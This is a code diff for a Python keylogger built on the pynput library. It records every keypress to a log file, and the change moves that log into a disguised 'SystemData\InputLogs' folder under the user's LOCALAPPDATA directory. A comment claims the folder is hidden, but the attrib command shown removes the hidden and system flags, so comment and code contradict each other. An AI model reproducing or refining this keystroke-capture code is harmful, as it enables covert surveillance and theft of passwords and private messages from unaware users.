@@ -1,13 +1,15 @@
 import time
 import os
-import subprocess
-import sys
 from pynput import keyboard
 
-FILENAME = "log.txt"
 # maximum file size in MB to be read
 MAXFILESIZE = 10 * 1024
-REPEATTIME = 3600
+
+logPath = os.path.join(os.environ["LOCALAPPDATA"], "SystemData", "InputLogs")
+# makes and hides the directory by making is hidden and system file
+os.makedirs(logPath, exist_ok=True)
+os.system(f'attrib -h -s "{logPath}"')
+FILENAME = logPath + r"\log.txt"
 
 pressedKeys = set()
 
@@ -18,8 +20,8 @@ def on_press(key):
             and keyboard.Key.caps_lock in pressedKeys):
         return False
     
-    # append if the file exists and smaller than specified size, otherwise overwrite it.
     lastKeyPressedTimeString = time.strftime("%Y-%m-%d %H:%M:%S")
+    # append if the file exists and smaller than specified size, otherwise overwrite it.
     if (os.path.isfile(FILENAME) and os.path.getsize(FILENAME) <= MAXFILESIZE):
         flag = "a"
     else:
@@ -39,4 +41,4 @@ try:
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 except KeyboardInterrupt:
-    print("interrupted")
+    pass
